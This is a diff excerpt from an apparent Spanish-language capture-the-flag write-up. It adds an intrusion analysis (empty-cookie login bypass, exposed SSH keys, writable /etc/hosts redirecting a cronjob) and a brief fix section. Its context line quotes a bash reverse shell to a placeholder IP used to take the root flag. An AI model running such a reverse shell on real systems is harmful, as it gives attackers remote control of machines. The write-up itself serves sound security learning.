@@ -49,3 +49,14 @@ bash -i >& /dev/tcp/IP/8080 0>&1
 ```
 
 Y con esto solo quedaria abrir un listener en nuestra máquina y coger la root flag 
+# Analisís de la intrusión
+### Vuln auth method
+Para gestionar el login el script utilizado es vulnerable ya que permite acceder con una cookie vacia bypasseando el login
+### Information Leak
+En el servidor podemos encontrar informacion sensible como claves ssh expuestas permitiendo que al bypassear la autenticación obtengamos acceso completo a la máquina
+### Bad permisions on /etc/hosts
+/etc/host es modificable por usuarios sin privilegios cambiando el host del cronjob por otro
+
+# Soluciones
+### Vuln auth method
+No controlo suficiente javascript para parchear el metodo, pero trasladar esta autenticación al server side probablemente mejoraría la seguridad del metodo de login
